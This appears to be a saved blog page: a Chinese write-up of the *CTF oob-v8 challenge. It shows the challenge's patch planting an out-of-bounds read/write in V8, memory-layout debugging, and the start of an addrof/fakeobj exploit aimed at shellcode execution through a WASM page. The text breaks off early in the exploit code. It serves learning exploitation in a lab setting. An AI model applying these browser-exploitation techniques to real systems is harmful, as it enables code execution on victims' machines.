@@ -1,0 +1,1157 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CTF oob-v8 | PwnTips</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="CTF oob-v8" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="参照 starctf-oob-v8-indepth 完成 CTF 题目 oob-v8，学习 v8 漏洞利用。" />
+<meta property="og:description" content="参照 starctf-oob-v8-indepth 完成 CTF 题目 oob-v8，学习 v8 漏洞利用。" />
+<link rel="canonical" href="https://pwntips.github.io/2022/04/30/CTF-oob-v8.html" />
+<meta property="og:url" content="https://pwntips.github.io/2022/04/30/CTF-oob-v8.html" />
+<meta property="og:site_name" content="PwnTips" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-04-30T00:00:00+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CTF oob-v8" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-04-30T00:00:00+08:00","datePublished":"2022-04-30T00:00:00+08:00","description":"参照 starctf-oob-v8-indepth 完成 CTF 题目 oob-v8，学习 v8 漏洞利用。","headline":"CTF oob-v8","mainEntityOfPage":{"@type":"WebPage","@id":"https://pwntips.github.io/2022/04/30/CTF-oob-v8.html"},"url":"https://pwntips.github.io/2022/04/30/CTF-oob-v8.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://pwntips.github.io/feed.xml" title="PwnTips" /><script async src="https://www.googletagmanager.com/gtag/js?id=G-LDS6Z1TT65"></script>
+<script>
+  window['ga-disable-G-LDS6Z1TT65'] = window.doNotTrack === "1" || navigator.doNotTrack === "1" || navigator.doNotTrack === "yes" || navigator.msDoNotTrack === "1";
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){window.dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-LDS6Z1TT65');
+</script>
+
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">PwnTips</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">CTF oob-v8</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2022-04-30T00:00:00+08:00" itemprop="datePublished">
+        Apr 30, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>参照 <a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">starctf-oob-v8-indepth</a> 完成 CTF 题目 oob-v8，学习 v8 漏洞利用。</p>
+
+<h2 id="准备">准备</h2>
+
+<p>参照<a href="https://v8.dev/docs/build">官方文档</a>准备 v8 的构建环境。</p>
+
+<hr />
+
+<p><strong>ℹ️NOTE</strong>: 有 Chromium 的构建环境话，把构建命令改成 <code class="language-plaintext highlighter-rouge">autoninja -C out\Default\ d8</code> 就可以构建 d8.exe。</p>
+
+<hr />
+
+<h2 id="题目">题目</h2>
+
+<p>题目修改了 v8 源码，给数组添加了一个有漏洞的函数 <code class="language-plaintext highlighter-rouge">oob</code>。</p>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
+index b027d36..ef1002f 100644
+</span><span class="gd">--- a/src/bootstrapper.cc
+</span><span class="gi">+++ b/src/bootstrapper.cc
+</span><span class="p">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,
+                           Builtins::kArrayPrototypeCopyWithin, 2, false);
+     SimpleInstallFunction(isolate_, proto, "fill",
+                           Builtins::kArrayPrototypeFill, 1, false);
+<span class="gi">+    SimpleInstallFunction(isolate_, proto, "oob",
++                          Builtins::kArrayOob,2,false);
+</span>     SimpleInstallFunction(isolate_, proto, "find",
+                           Builtins::kArrayPrototypeFind, 1, false);
+     SimpleInstallFunction(isolate_, proto, "findIndex",
+<span class="gh">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
+index 8df340e..9b828ab 100644
+</span><span class="gd">--- a/src/builtins/builtins-array.cc
+</span><span class="gi">+++ b/src/builtins/builtins-array.cc
+</span><span class="p">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
+   return *final_length;
+ }
+ }  // namespace
+<span class="gi">+BUILTIN(ArrayOob){
++    uint32_t len = args.length();
++    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();
++    Handle&lt;JSReceiver&gt; receiver;
++    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
++            isolate, receiver, Object::ToObject(isolate, args.receiver()));
++    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);
++    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());
++    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());
++    if(len == 1){
++        //read
++        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));
++    }else{
++        //write
++        Handle&lt;Object&gt; value;
++        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
++                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));
++        elements.set(length,value-&gt;Number());
++        return ReadOnlyRoots(isolate).undefined_value();
++    }
++}
+</span>
+ BUILTIN(ArrayPush) {
+   HandleScope scope(isolate);
+<span class="gh">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
+index 0447230..f113a81 100644
+</span><span class="gd">--- a/src/builtins/builtins-definitions.h
+</span><span class="gi">+++ b/src/builtins/builtins-definitions.h
+</span><span class="p">@@ -368,6 +368,7 @@</span> namespace internal {
+   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
+   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
+   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+<span class="gi">+  CPP(ArrayOob)                                                                \
+</span>                                                                                \
+   /* ArrayBuffer */                                                            \
+   /* ES #sec-arraybuffer-constructor */                                        \
+<span class="gh">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
+index ed1e4a5..c199e3a 100644
+</span><span class="gd">--- a/src/compiler/typer.cc
+</span><span class="gi">+++ b/src/compiler/typer.cc
+</span><span class="p">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
+       return Type::Receiver();
+     case Builtins::kArrayUnshift:
+       return t-&gt;cache_-&gt;kPositiveSafeInteger;
+<span class="gi">+    case Builtins::kArrayOob:
++      return Type::Receiver();
+</span>
+     // ArrayBuffer functions.
+     case Builtins::kArrayBufferIsView:
+</code></pre></div></div>
+
+<p>这段代码定义了 builtins 函数 <code class="language-plaintext highlighter-rouge">ArrayOob</code>，把它赋值到 <code class="language-plaintext highlighter-rouge">Array.prototype.oob</code>。</p>
+
+<p>重点分析下 <code class="language-plaintext highlighter-rouge">ArrayOob</code> 函数的实现：</p>
+
+<ul>
+  <li>检查参数数量，超过两个直接返回 <code class="language-plaintext highlighter-rouge">undefined</code>。 <br />
+<code class="language-plaintext highlighter-rouge">args</code> 中存储着 builtins 函数的所有参数，可以看做存放了 <code class="language-plaintext highlighter-rouge">args.length()</code> 个对象的数组。</li>
+  <li>从 <code class="language-plaintext highlighter-rouge">args</code> 中取得特殊的参数 <code class="language-plaintext highlighter-rouge">receiver</code>。 <br />
+<code class="language-plaintext highlighter-rouge">receiver</code> 就相当于 JavsScript 函数中的 this 对象。 <br />
+<code class="language-plaintext highlighter-rouge">Handle\&lt;receiver\&gt;</code> 中的 <code class="language-plaintext highlighter-rouge">Handle</code> 可以看做智能指针。</li>
+  <li>把 <code class="language-plaintext highlighter-rouge">receiver</code> 当做浮点数数组使用，获取数组的缓冲区 <code class="language-plaintext highlighter-rouge">elements</code>。</li>
+  <li>如果只有一个参数：读取 <code class="language-plaintext highlighter-rouge">elements</code> 下标 <code class="language-plaintext highlighter-rouge">array-&gt;length()</code> 处存放的值。</li>
+  <li>如果有两个参数：参数 2 写入 <code class="language-plaintext highlighter-rouge">elements</code> 下标 <code class="language-plaintext highlighter-rouge">array-&gt;length()</code> 处，返回 <code class="language-plaintext highlighter-rouge">undefined</code>。</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">array-&gt;length()</code> 返回的是数组 <code class="language-plaintext highlighter-rouge">array</code> 的元素数量，数组索引的有效范围是 [0, array-&gt;length())，访问索引 <code class="language-plaintext highlighter-rouge">array-&gt;length()</code> 属于越界访问。</p>
+
+<p>我已经有现成的 v8 构建环境，就没有下载原题，而是在随便一个 COMMIT 上依照 PATCH 修改代码，构建出 d8.exe。（COMMIT ID 185badc9122fe6274c1b2fe54e03fda5315cb80e）</p>
+
+<p>测试 <code class="language-plaintext highlighter-rouge">oob</code> 函数是否能正常使用：</p>
+
+<hr />
+
+<p><strong>ℹ️NOTE</strong>: 使用 Release 版的 d8.exe，Debug 版会触发断言。</p>
+
+<hr />
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> d8.exe
+V8 version 9.4.0 <span class="o">(</span>candidate<span class="o">)</span>
+d8&gt; a <span class="o">=</span> <span class="o">[</span>0]
+<span class="o">[</span>0]
+d8&gt; a.oob<span class="o">()</span>
+1.380041495160898e-269
+d8&gt; a.oob<span class="o">(</span>1<span class="o">)</span>
+undefined
+</code></pre></div></div>
+
+<h2 id="利用">利用</h2>
+
+<p>环境准备好以后，开始写利用代码，JavaScript 漏洞利用，是可以套用一个固定模式的：</p>
+
+<p>先构造出 addrof 和 fakeobj 两个操作，就可以创建出指向任意地址的 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 对象，实现任意内存读、写。</p>
+
+<ul>
+  <li>fakeobj: 伪造任意的JS对象</li>
+  <li>addrof: 读取任意 JavaScript 对象的地址</li>
+</ul>
+
+<p>有了任意内存读、写，利用 WASM 模块导出函数所在的内存页面是 RWX 的这一特性，把函数指令修改成 shellcode，之后再调用函数，就相当于执行 shellcode。</p>
+
+<h3 id="内存布局">内存布局</h3>
+
+<p>要实现 addrof 和 fakeobj，先要观察程序的内存布局，分析通过漏洞能越界访问到的数据。这里用 d8.exe 提供了调试函数 <code class="language-plaintext highlighter-rouge">%DebugPrint</code> 输出对象的内存地址，在用调试器查看内存数据，使用 <code class="language-plaintext highlighter-rouge">%DebugPrint</code> 需要在启动 d8 时指定 --natives-syntax 命令。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> d8.exe <span class="nt">--allow-natives-syntax</span>
+V8 version 9.4.0 <span class="o">(</span>candidate<span class="o">)</span>
+d8&gt; a <span class="o">=</span> <span class="o">[</span>1.1, 1.2]
+<span class="o">[</span>1.1, 1.2]
+d8&gt; %DebugPrint<span class="o">(</span>a<span class="o">)</span>
+DebugPrint: 000003D40810A6F9: <span class="o">[</span>JSArray]
+ - map: 0x03d4082c3ae1 &lt;Map<span class="o">(</span>PACKED_DOUBLE_ELEMENTS<span class="o">)&gt;</span> <span class="o">[</span>FastProperties]
+ - prototype: 0x03d40828bebd &lt;JSArray[0]&gt;
+ - elements: 0x03d40810a6e1 &lt;FixedDoubleArray[2]&gt; <span class="o">[</span>PACKED_DOUBLE_ELEMENTS]
+ - length: 2
+ - properties: 0x03d40800222d &lt;FixedArray[0]&gt;
+ - All own properties <span class="o">(</span>excluding elements<span class="o">)</span>: <span class="o">{</span>
+    000003D4080048F1: <span class="o">[</span>String] <span class="k">in </span>ReadOnlySpace: <span class="c">#length: 0x03d40820215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span>
+ <span class="o">}</span>
+ - elements: 0x03d40810a6e1 &lt;FixedDoubleArray[2]&gt; <span class="o">{</span>
+           0: 1.1
+           1: 1.2
+ <span class="o">}</span>
+000003D4082C3AE1: <span class="o">[</span>Map]
+ - <span class="nb">type</span>: JS_ARRAY_TYPE
+ - instance size: 16
+ - inobject properties: 0
+ - elements kind: PACKED_DOUBLE_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - back pointer: 0x03d4082c3ab9 &lt;Map<span class="o">(</span>HOLEY_SMI_ELEMENTS<span class="o">)&gt;</span>
+ - prototype_validity cell: 0x03d408202405 &lt;Cell <span class="nv">value</span><span class="o">=</span> 1&gt;
+ - instance descriptors <span class="c">#1: 0x03d40828c38d &lt;DescriptorArray[1]&gt;</span>
+ - transitions <span class="c">#1: 0x03d40828c3d9 &lt;TransitionArray[4]&gt;Transition array #1:</span>
+     0x03d408005229 &lt;Symbol: <span class="o">(</span>elements_transition_symbol<span class="o">)&gt;</span>: <span class="o">(</span>transition to HOLEY_DOUBLE_ELEMENTS<span class="o">)</span> -&gt; 0x03d4082c3b09 &lt;Map<span class="o">(</span>HOLEY_DOUBLE_ELEMENTS<span class="o">)&gt;</span>
+
+ - prototype: 0x03d40828bebd &lt;JSArray[0]&gt;
+ - constructor: 0x03d40828bc4d &lt;JSFunction Array <span class="o">(</span>sfi <span class="o">=</span> 000003D40820FE71<span class="o">)&gt;</span>
+ - dependent code: 0x03d4080021b9 &lt;Other heap object <span class="o">(</span>WEAK_FIXED_ARRAY_TYPE<span class="o">)&gt;</span>
+ - construction counter: 0
+
+<span class="o">[</span>1.1, 1.2]
+</code></pre></div></div>
+
+<p>第一行 <code class="language-plaintext highlighter-rouge">DebugPrint: 000003D40810A6F9: [JSArray]</code> 是指 a 在内存中的指针是 <code class="language-plaintext highlighter-rouge">000003D40810A6F9</code>，数据类型是 <code class="language-plaintext highlighter-rouge">JSArray</code>。</p>
+
+<p><code class="language-plaintext highlighter-rouge">0x000003D40810A6F9</code> 作为一个对象的起始地址是有点奇怪的，一般来说内存块起始地址都是按 4 或 8 对齐的，不会出现一个对象从奇数地址开始的情况。这是因为 <code class="language-plaintext highlighter-rouge">0x000003D40810A6F9</code> 严格来说并不是 <code class="language-plaintext highlighter-rouge">a</code> 的指针，而是标记指针（Tagged pointer）。</p>
+
+<p>标记指针是优化后的指针，v8 是在一个很小的范围内分配的对象的内存，64 位地址的高 32 位都是一样的，为了减小指针的内存占用，v8 就只存储指针的低 32 位。而且对象的指针都是对齐过的，最低位固定为 0，可以作为标志位使用。最低位置位时代表数据类型是标记指针，清零代表存放的是 Smi。Smi 是对小整数的一种优化，把一个小整数左移一位就得到了它对应的 Smi。更多内容，参考v8的<a href="https://v8.dev/blog/pointer-compression">文档</a>。</p>
+
+<p>所以 <code class="language-plaintext highlighter-rouge">a</code> 真实的地址是 <code class="language-plaintext highlighter-rouge">0x000003D40810A6F8</code>，在调试器里查看存储的数据</p>
+
+<p><img src="/assets/images/Pasted image 20220203000947.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">JSArray</code> 对应 CPP 中的 <code class="language-plaintext highlighter-rouge">v8::internall::JSArray</code>，阅读代码得知它有以下几个成员：</p>
+
+<ul>
+  <li>map: 存放对象的类型信息，如：原型、属性名</li>
+  <li>properties: 对象属性的指针</li>
+  <li>elements: 数组元素的指针</li>
+  <li>length: 数组长度 (Smi)</li>
+</ul>
+
+<p>再看下 elements 处的内存布局</p>
+
+<p><img src="/assets/images/Pasted image 20220203001131.png" alt="" /></p>
+
+<p>elements 指向的是作为缓冲区使用的 FixedArray 对象，包含：</p>
+
+<ul>
+  <li>map</li>
+  <li>length</li>
+  <li>内嵌的缓冲区</li>
+</ul>
+
+<p>按双精度浮点数显示，就可以看到存放在数组中的 1.1, 1.2 两个浮点数。</p>
+
+<p><img src="/assets/images/Pasted image 20220203001306.png" alt="" /></p>
+
+<p>越界访问到的就是跟在 1.2 之后的值，也就是 <code class="language-plaintext highlighter-rouge">0x99993d49810a6f8</code> 起始的 8 字节内存。这刚好就是 <code class="language-plaintext highlighter-rouge">a</code> 的起始地址，存放的是 <code class="language-plaintext highlighter-rouge">a</code> 的 map 和 properties，测试几次发现都是这样的。这样的话越界访问就可以读、写浮点数组的 map 和 properties。</p>
+
+<hr />
+
+<p><strong>ℹ️NOTE</strong>: 深入分析的话，会发现在数组的创建过程中，这两个内存块是紧接在一起线性分配的，在数组大小选取的合适情况下，内存地址一定是相连的。</p>
+
+<hr />
+
+<h3 id="addrof">addrof</h3>
+
+<p>map 中存放了关于对象类型的信息，例如原型，属性等。把浮点数数组的 map 替换成对象数组的，v8 解释器就会把它当做对象数组。利用这个特性，通过如下操作就可以读到对象的指针：</p>
+
+<ul>
+  <li>浮点数组 map 改成对象数组</li>
+  <li>对象存入数组的指定位置，存入的缓冲区的数据，实际上对象的指针</li>
+  <li>再把 map 恢复回去</li>
+  <li>把指针当做浮点数从数组读出</li>
+</ul>
+
+<p>目前已经可以读、写浮点数组 map，只要再找到读取对象数组 map 的方法，addrof 就可以实现了。</p>
+
+<p>观察下对象数组的内存布局，看看对象数组的越界访问能读到什么：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d8&gt; obj <span class="o">=</span> <span class="o">{}</span>
+<span class="o">{}</span>
+d8&gt; <span class="nb">let </span>arr2 <span class="o">=</span> <span class="o">[</span>obj]
+undefined
+d8&gt; %DebugPrint<span class="o">(</span>arr2<span class="o">)</span>
+DebugPrint: 000003C00810B071: <span class="o">[</span>JSArray]
+ - map: 0x03c0082c3b31 &lt;Map<span class="o">(</span>PACKED_ELEMENTS<span class="o">)&gt;</span> <span class="o">[</span>FastProperties]
+ - prototype: 0x03c00828bebd &lt;JSArray[0]&gt;
+ - elements: 0x03c00810b065 &lt;FixedArray[1]&gt; <span class="o">[</span>PACKED_ELEMENTS]
+ - length: 1
+ - properties: 0x03c00800222d &lt;FixedArray[0]&gt;
+ - All own properties <span class="o">(</span>excluding elements<span class="o">)</span>: <span class="o">{</span>
+    000003C0080048F1: <span class="o">[</span>String] <span class="k">in </span>ReadOnlySpace: <span class="c">#length: 0x03c00820215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span>
+ <span class="o">}</span>
+ - elements: 0x03c00810b065 &lt;FixedArray[1]&gt; <span class="o">{</span>
+           0: 0x03c00810afad &lt;Object map <span class="o">=</span> 000003C0082C22D1&gt;
+ <span class="o">}</span>
+000003C0082C3B31: <span class="o">[</span>Map]
+ - <span class="nb">type</span>: JS_ARRAY_TYPE
+ - instance size: 16
+ - inobject properties: 0
+ - elements kind: PACKED_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - back pointer: 0x03c0082c3b09 &lt;Map<span class="o">(</span>HOLEY_DOUBLE_ELEMENTS<span class="o">)&gt;</span>
+ - prototype_validity cell: 0x03c008202405 &lt;Cell <span class="nv">value</span><span class="o">=</span> 1&gt;
+ - instance descriptors <span class="c">#1: 0x03c00828c38d &lt;DescriptorArray[1]&gt;</span>
+ - transitions <span class="c">#1: 0x03c00828c409 &lt;TransitionArray[4]&gt;Transition array #1:</span>
+     0x03c008005229 &lt;Symbol: <span class="o">(</span>elements_transition_symbol<span class="o">)&gt;</span>: <span class="o">(</span>transition to HOLEY_ELEMENTS<span class="o">)</span> -&gt; 0x03c0082c3b59 &lt;Map<span class="o">(</span>HOLEY_ELEMENTS<span class="o">)&gt;</span>
+
+ - prototype: 0x03c00828bebd &lt;JSArray[0]&gt;
+ - constructor: 0x03c00828bc4d &lt;JSFunction Array <span class="o">(</span>sfi <span class="o">=</span> 000003C00820FE71<span class="o">)&gt;</span>
+ - dependent code: 0x03c0080021b9 &lt;Other heap object <span class="o">(</span>WEAK_FIXED_ARRAY_TYPE<span class="o">)&gt;</span>
+ - construction counter: 0
+
+<span class="o">[{}]</span>
+</code></pre></div></div>
+
+<p>查看内存数据：</p>
+
+<p><img src="/assets/images/Pasted image 20220213221256.png" alt="" /></p>
+
+<p>对象数组的元素是 4 字节的标记指针，而 <code class="language-plaintext highlighter-rouge">oob</code> 函数是把数组元素当做 8 字节的浮点数处理的，这使得对象数组的 <code class="language-plaintext highlighter-rouge">oob</code> 是不能直接读取到 map 的。</p>
+
+<p>不过随着数组元素数量的增加，<code class="language-plaintext highlighter-rouge">oob</code> 能读到的位置是在向下移动的，最终一定会越过对象数组的所在的区域，读到高地址处其他的值。如果我们先在后面的内存中布局其它的对象数组，就有可能读到其它对象数组的 map。</p>
+
+<p>经过简单的计算和尝试，找到了一个合适的方案：创建相邻的两个对象数组，第一个数组有 8 个元素，第二个数组有 2 个元素。第一个数组的 <code class="language-plaintext highlighter-rouge">oob</code> 函数刚好就可以读到第二个数组的 Map 值。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d8&gt; arr2 <span class="o">=</span> <span class="o">[</span>obj, obj, obj, obj, obj, obj, obj, obj]<span class="p">;</span><span class="nv">arr3</span><span class="o">=[</span>obj,obj]
+<span class="o">[{}</span>, <span class="o">{}]</span>
+d8&gt; %DebugPrint<span class="o">(</span>arr2<span class="o">)</span>
+DebugPrint: 000003C00810B239: <span class="o">[</span>JSArray]
+ - map: 0x03c0082c3b31 &lt;Map<span class="o">(</span>PACKED_ELEMENTS<span class="o">)&gt;</span> <span class="o">[</span>FastProperties]
+ - prototype: 0x03c00828bebd &lt;JSArray[0]&gt;
+ - elements: 0x03c00810b211 &lt;FixedArray[8]&gt; <span class="o">[</span>PACKED_ELEMENTS]
+ - length: 8
+ - properties: 0x03c00800222d &lt;FixedArray[0]&gt;
+ - All own properties <span class="o">(</span>excluding elements<span class="o">)</span>: <span class="o">{</span>
+    000003C0080048F1: <span class="o">[</span>String] <span class="k">in </span>ReadOnlySpace: <span class="c">#length: 0x03c00820215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span>
+ <span class="o">}</span>
+ - elements: 0x03c00810b211 &lt;FixedArray[8]&gt; <span class="o">{</span>
+         0-7: 0x03c00810afad &lt;Object map <span class="o">=</span> 000003C0082C22D1&gt;
+ <span class="o">}</span>
+000003C0082C3B31: <span class="o">[</span>Map]
+ - <span class="nb">type</span>: JS_ARRAY_TYPE
+ - instance size: 16
+ - inobject properties: 0
+ - elements kind: PACKED_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - back pointer: 0x03c0082c3b09 &lt;Map<span class="o">(</span>HOLEY_DOUBLE_ELEMENTS<span class="o">)&gt;</span>
+ - prototype_validity cell: 0x03c008202405 &lt;Cell <span class="nv">value</span><span class="o">=</span> 1&gt;
+ - instance descriptors <span class="c">#1: 0x03c00828c38d &lt;DescriptorArray[1]&gt;</span>
+ - transitions <span class="c">#1: 0x03c00828c409 &lt;TransitionArray[4]&gt;Transition array #1:</span>
+     0x03c008005229 &lt;Symbol: <span class="o">(</span>elements_transition_symbol<span class="o">)&gt;</span>: <span class="o">(</span>transition to HOLEY_ELEMENTS<span class="o">)</span> -&gt; 0x03c0082c3b59 &lt;Map<span class="o">(</span>HOLEY_ELEMENTS<span class="o">)&gt;</span>
+
+ - prototype: 0x03c00828bebd &lt;JSArray[0]&gt;
+ - constructor: 0x03c00828bc4d &lt;JSFunction Array <span class="o">(</span>sfi <span class="o">=</span> 000003C00820FE71<span class="o">)&gt;</span>
+ - dependent code: 0x03c0080021b9 &lt;Other heap object <span class="o">(</span>WEAK_FIXED_ARRAY_TYPE<span class="o">)&gt;</span>
+ - construction counter: 0
+
+<span class="o">[{}</span>, <span class="o">{}</span>, <span class="o">{}</span>, <span class="o">{}</span>, <span class="o">{}</span>, <span class="o">{}</span>, <span class="o">{}</span>, <span class="o">{}]</span>
+d8&gt; %DebugPrint<span class="o">(</span>arr3<span class="o">)</span>
+DebugPrint: 000003C00810B259: <span class="o">[</span>JSArray]
+ - map: 0x03c0082c3b31 &lt;Map<span class="o">(</span>PACKED_ELEMENTS<span class="o">)&gt;</span> <span class="o">[</span>FastProperties]
+ - prototype: 0x03c00828bebd &lt;JSArray[0]&gt;
+ - elements: 0x03c00810b249 &lt;FixedArray[2]&gt; <span class="o">[</span>PACKED_ELEMENTS]
+ - length: 2
+ - properties: 0x03c00800222d &lt;FixedArray[0]&gt;
+ - All own properties <span class="o">(</span>excluding elements<span class="o">)</span>: <span class="o">{</span>
+    000003C0080048F1: <span class="o">[</span>String] <span class="k">in </span>ReadOnlySpace: <span class="c">#length: 0x03c00820215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span>
+ <span class="o">}</span>
+ - elements: 0x03c00810b249 &lt;FixedArray[2]&gt; <span class="o">{</span>
+         0-1: 0x03c00810afad &lt;Object map <span class="o">=</span> 000003C0082C22D1&gt;
+ <span class="o">}</span>
+000003C0082C3B31: <span class="o">[</span>Map]
+ - <span class="nb">type</span>: JS_ARRAY_TYPE
+ - instance size: 16
+ - inobject properties: 0
+ - elements kind: PACKED_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - back pointer: 0x03c0082c3b09 &lt;Map<span class="o">(</span>HOLEY_DOUBLE_ELEMENTS<span class="o">)&gt;</span>
+ - prototype_validity cell: 0x03c008202405 &lt;Cell <span class="nv">value</span><span class="o">=</span> 1&gt;
+ - instance descriptors <span class="c">#1: 0x03c00828c38d &lt;DescriptorArray[1]&gt;</span>
+ - transitions <span class="c">#1: 0x03c00828c409 &lt;TransitionArray[4]&gt;Transition array #1:</span>
+     0x03c008005229 &lt;Symbol: <span class="o">(</span>elements_transition_symbol<span class="o">)&gt;</span>: <span class="o">(</span>transition to HOLEY_ELEMENTS<span class="o">)</span> -&gt; 0x03c0082c3b59 &lt;Map<span class="o">(</span>HOLEY_ELEMENTS<span class="o">)&gt;</span>
+
+ - prototype: 0x03c00828bebd &lt;JSArray[0]&gt;
+ - constructor: 0x03c00828bc4d &lt;JSFunction Array <span class="o">(</span>sfi <span class="o">=</span> 000003C00820FE71<span class="o">)&gt;</span>
+ - dependent code: 0x03c0080021b9 &lt;Other heap object <span class="o">(</span>WEAK_FIXED_ARRAY_TYPE<span class="o">)&gt;</span>
+ - construction counter: 0
+
+<span class="o">[{}</span>, <span class="o">{}]</span>
+</code></pre></div></div>
+
+<p>查看内存：</p>
+
+<p><img src="/assets/images/Pasted image 20220213224048.png" alt="" /></p>
+
+<p>对第一个数组调用 <code class="language-plaintext highlighter-rouge">oob</code>，访问的内存为 <code class="language-plaintext highlighter-rouge">0x000003C00810B218 + 0x8 * 0x8 =&gt; 0x000003C00810B258</code>，刚好是第二个数组的 map 所在的位置。</p>
+
+<p>addrof 代码实现如下：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">f64</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">i64</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigInt64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f</span><span class="p">;</span>
+	<span class="k">return</span> <span class="nx">i64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nx">i64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
+	<span class="k">return</span> <span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">zero_high_word</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">return</span> <span class="nx">i</span> <span class="o">&amp;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="dl">"</span><span class="s2">0x00000000ffffffff</span><span class="dl">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">get_map_double_array</span><span class="p">()</span> <span class="p">{</span>
